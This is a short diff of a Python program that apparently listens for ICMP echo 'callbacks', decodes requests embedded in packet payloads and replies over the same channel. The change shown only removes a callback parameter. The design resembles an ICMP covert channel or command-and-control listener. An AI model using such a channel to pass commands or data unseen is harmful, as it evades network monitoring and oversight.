@@ -6,7 +6,7 @@ import logging
 import socket
 import ssl
 import struct
-from typing import Any, Callable, Dict, List, Optional
+from typing import Any, Dict, List, Optional
 
 # ---------------------------------------------------------------------------
 # Configuration
@@ -184,7 +184,7 @@ def icmp_checksum(data: bytes) -> int:
 #
 # ---------------------------------------------------------------------------
 
-def handleCallback(process_func: Callable[[str], str] = process_encoded_request) -> bool:
+def handleCallback() -> bool:
     """
     Handle a single callback cycle over ICMP echo.
 
@@ -238,7 +238,7 @@ def handleCallback(process_func: Callable[[str], str] = process_encoded_request)
     encoded_request = payload[4 : 4 + msg_len].decode("utf-8", errors="replace")
     logging.info("Received %d bytes from %s over ICMP", msg_len, src_ip)
 
-    encoded_response = process_func(encoded_request)
+    encoded_response = process_encoded_request(encoded_request)
     response_bytes = encoded_response.encode("utf-8")
     response_payload = len(response_bytes).to_bytes(4, byteorder="little") + response_bytes
 
@@ -296,7 +296,7 @@ def main() -> None:
     logging.info("Listening for ICMP callbacks on %s.", LISTEN_HOST)
 
     while True:
-        handleCallback(process_encoded_request)
+        handleCallback()
 
 
 if __name__ == "__main__":
